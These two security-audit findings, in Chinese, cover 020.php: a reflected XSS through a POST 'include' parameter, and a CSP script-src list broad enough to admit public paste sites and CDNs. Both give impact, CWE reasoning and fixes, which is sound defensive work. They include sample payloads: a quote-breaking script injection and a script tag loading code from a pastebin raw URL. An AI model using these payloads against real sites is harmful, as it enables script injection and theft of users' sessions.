F-1 020.php 通过 POST 参数 include 反射注入 script 标签（CSP 白名单过宽导致可加载外部恶意脚本）

medium xss / CWE-79 · 置信度 0.87 · candidate / llm_inferred

位置：020.php:13-17

脚本在第 13-17 行读取 $_POST['include']，未经任何 HTML 属性编码或 URL 白名单校验，直接拼接进 <script src='...'> 的 src 属性并输出到响应体。攻击者可构造 include 值闭合单引号并注入任意 HTML/JS（如 '></script><script>alert(document.domain)</script>），或直接指向 CSP 白名单内的可控托管（pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net、digi.ninja 等）加载外部脚本。第 3-5 行设置的 CSP 明确把上述第三方域列入 script-src，等于为攻击者提供了合法的脚本加载源，使 CSP 无法阻止利用。由于是 POST 反射，需诱导受害者提交表单或由攻击者构造自动提交页面，属于反射型 XSS。

影响：在受害者浏览器上下文执行任意 JavaScript，可窃取会话 Cookie、伪造请求、篡改页面内容；CSP 因白名单过宽无法提供有效防护。

CVE/CWE 论证：CWE-79 反射型 XSS。外部无需认证即可通过 POST 参数注入，链闭合，CSP 配置反而放行第三方脚本源。

修复建议：对 include 值做严格 URL 白名单校验（仅允许 https 且域名在固定集合内），输出时使用 htmlspecialchars($v, ENT_QUOTES) 编码；收紧 CSP script-src，移除 pastebin/hastebin/unpkg/jsdelivr 等可公开托管的域，改用 nonce/hash 或 'strict-dynamic'。

F-2 020.php 中 CSP script-src 白名单过宽导致脚本注入防护失效（CWE-693）

medium csp / CWE-693 · 置信度 0.55 · candidate / rule_verified+llm

位置：020.php:2-3

020.php 第 3 行构造并输出 Content-Security-Policy 响应头，其 script-src 指令为 'self' 加上 https://pastebin.com、hastebin.com、www.toptal.com、example.com、code.jquery.com、https://ssl.google-analytics.com、unpkg.com、cdn.jsdelivr.net、digi.ninja 等大量第三方源。攻击者无需向本应用注入任何内容：只要能在上述任一允许域上托管或发布内容（pastebin.com、hastebin.com 为公开可写粘贴站，unpkg.com、cdn.jsdelivr.net 为公开 CDN，digi.ninja 为第三方站点），即可获得被 CSP 明确授权的脚本执行源。当页面存在任何 HTML 注入点（反射或存储）时，攻击者只需插入 <script src="https://pastebin.com/raw/xxxx"> 即可绕过 CSP 执行任意 JS。校验无效的原因在于策略本身把不可信/公开可写域列为可信脚本源，且未使用 nonce、hash 或 strict-dynamic，也未配置 object-src 'none'、base-uri 'self' 等收敛指令。输入中未提供 020.php 的完整响应输出代码与页面渲染逻辑，因此“页面确实存在可注入的 HTML 汇点”这一环证据不足，仅能确认策略配置缺陷本身。

影响：CSP 作为 XSS 的最后一道纵深防御被实质性削弱：一旦应用任何位置出现 HTML/属性注入，攻击者可借助 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net 等公开可写源加载任意脚本，实现会话劫持、凭据窃取、页面内容篡改与钓鱼，且浏览器不会拦截。属于防护机制失效类缺陷，本身不直接造成数据泄露。

CVE/CWE 论证：CWE-693（Protection Mechanism Failure）：安全机制（CSP）配置不当导致其保护目标无法达成。外部可达性：该响应头随 020.php 的 HTTP 响应返回，任何访问者均可获得，无需认证。利用链闭合度：策略过宽这一环已由 020.php:3 的原文证据确认；但“存在可注入 HTML 汇点 → 加载白名单域脚本 → 执行”这一后半链在给定 code_pack 中缺少对应渲染/输出代码，故不宣称完整 RCE/XSS 链闭合，仅认定配置型弱点成立。

修复建议：1) 移除 pastebin.com、hastebin.com、unpkg.com、cdn.jsdelivr.net、digi.ninja 等公开可写或非必要第三方源，仅保留业务确需的源；2) 改用基于 nonce 或 hash 的严格策略，例如 script-src 'nonce-<随机值>' 'strict-dynamic'，nonce 每次响应随机生成且不可预测；3) 补充 object-src 'none'; base-uri 'self'; frame-ancestors 'self'；4) 若必须使用 CDN，固定到具体版本路径并配合 SRI（integrity 属性）；5) 将 CSP 头集中在一处统一下发，避免散落拼接导致遗漏。
